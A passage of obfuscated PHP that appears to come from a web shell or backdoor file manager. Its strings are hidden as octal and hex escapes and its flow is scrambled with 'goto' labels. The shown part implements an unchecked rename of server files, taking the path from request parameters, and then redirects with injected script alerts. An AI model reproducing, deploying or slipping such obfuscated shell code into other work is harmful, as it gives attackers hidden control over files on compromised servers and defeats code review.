"\42\x3e\xa\40\x20\x20\40\x20\40\40\40\x3c\151\156\160\165\164\40\x74\x79\160\x65\x3d\42\163\165\142\155\151\x74\42\40\x63\154\x61\163\x73\x3d\x22\142\164\x6e\40\142\x74\x6e\x2d\144\x61\162\153\42\x20\166\141\x6c\165\x65\75\x22\122\145\x6e\141\x6d\145\x22\40\156\x61\x6d\145\x3d\42\x72\x65\156\x61\x6d\x65\x22\x3e\xa\40\40\40\x20\x3c\x2f\146\157\162\155\76\x3c\x2f\143\x65\156\x74\145\162\x3e"; if (isset($_POST["\x72\145\x6e\141\x6d\x65"])) { $name = PATH . "\57" . $_GET["\x72"]; if (rename($name, PATH . "\57" . $_POST["\156\x61\155\x65"])) { echo "\x3c\x73\x63\162\151\160\164\x3e\x61\154\145\162\x74\x28\x27\x52\145\156\x61\x6d\x65\x64\56\47\x29\73\40\x77\151\156\x64\x6f\x77\x2e\x6c\157\143\141\164\x69\x6f\x6e\56\x72\145\160\x6c\141\143\145\x28\47\77\160\x3d" . encodePath(PATH) . "\47\x29\73\x3c\57\163\143\x72\x69\x70\x74\76"; } else { echo "\x3c\x73\x63\x72\x69\160\164\76\141\x6c\x65\x72\x74\50\47\x53\x6f\155\x65\40\x65\x72\162\x6f\162\40\157\143\x63\165\162\x72\145\144\x2e\47\51\x3b\40\167\x69\x6e\x64\x6f\x77\56\154\157\143\x61\164\x69\157\156\x2e\x72\x65\x70\x6c\x61\143\145\50\x27\77\160\x3d" . encodePath(PATH) . "\47\51\73\74\57\x73\143\162\151\160\x74\76"; } } } } goto PRdfN; tSD3_: echo "\x3c\x64\x69\x76\40\x73\164\x79\154\x65\x3d\x27\x6d\x61\162\x67\151\x6e\55\154\x65\x66\164\x3a\x20\x30\x70\170\x3b\x27\x3e"; goto y0rgA; L7Zhi: ?>
</body></html>